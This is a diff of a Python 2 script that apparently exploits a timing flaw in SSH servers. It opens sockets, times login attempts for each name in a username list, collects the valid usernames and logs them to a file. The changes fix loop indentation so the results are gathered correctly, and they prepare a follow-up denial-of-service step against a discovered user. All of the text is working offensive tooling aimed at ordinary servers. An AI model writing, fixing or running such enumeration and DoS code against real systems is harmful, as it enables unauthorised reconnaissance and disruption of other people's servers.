@@ -194,12 +194,14 @@ def main():
 							for userName in userNames:
 								sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 								fUser = sshTime(host,port,userName,sock,defTime)
-							if fUser != -1 and fUser !=None:
-								foundUser.append(fUser)
-							sock.close()
+								if fUser != -1 and fUser !=None:
+									foundUser.append(fUser)
+								sock.close()
 							print_success(foundUser, banner)
-							if argus.outp != None:
-								fileOutput.write(entry[0] + '@' + host + ' ' + banner + ' (' + str(entry[3]) + ' seconds'  + ')\n')
+							for entry in foundUser:
+								if argus.outp != None:
+									userfdos = entry[0]
+									fileOutput.write(entry[0] + '@' + host + ' ' + banner + ' (' + str(entry[3]) + ' seconds'  + ')\n')
 						else:
 							print "[-] This version is not vulnerable."
 							print "[-] Nothing to do."
@@ -209,12 +211,14 @@ def main():
 						for userName in userNames:
 							sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 							fUser = sshTime(host,port,userName,sock,defTime)
-						if fUser != -1 and fUser !=None:
-							foundUser.append(fUser)
-						sock.close()
+							if fUser != -1 and fUser !=None:
+								foundUser.append(fUser)
+							sock.close()
 						print_success(foundUser, banner)
-						if argus.outp != None:
-							fileOutput.write(entry[0] + '@' + host + ' ' + banner + ' (' + str(entry[3]) + ' seconds'  + ')\n')
+						for entry in foundUser:
+							userfdos = entry[0]
+							if argus.outp != None:
+								fileOutput.write(entry[0] + '@' + host + ' ' + banner + ' (' + str(entry[3]) + ' seconds'  + ')\n')
 
 				else: 
 					print
@@ -245,8 +249,10 @@ def main():
 									foundUser.append(fUser)
 								sock.close()
 							print_success(foundUser, banner)
-							if argus.outp != None:
-								fileOutput.write(entry[0] + '@' + host + ' ' + banner + ' (' + str(entry[3]) + ' seconds'  + ')\n')
+							for entry in foundUser:
+								userfdos = entry[0]
+								if argus.outp != None:
+									fileOutput.write(entry[0] + '@' + host + ' ' + banner + ' (' + str(entry[3]) + ' seconds'  + ')\n')
 						else:
 							print "[-] This version is not vulnerable."
 							print "[-] Nothing to do."
@@ -267,8 +273,10 @@ def main():
 								foundUser.append(fUser)
 							sock.close()
 						print_success(foundUser, banner)
-						if argus.outp != None:
-							fileOutput.write(entry[0] + '@' + host + ' ' + banner + ' (' + str(entry[3]) + ' seconds'  + ')\n')
+						for entry in foundUser:
+							userfdos = entry[0]
+							if argus.outp != None:
+								fileOutput.write(entry[0] + '@' + host + ' ' + banner + ' (' + str(entry[3]) + ' seconds'  + ')\n')
 				if dos == 'yes':
 					if userfdos != None:
 
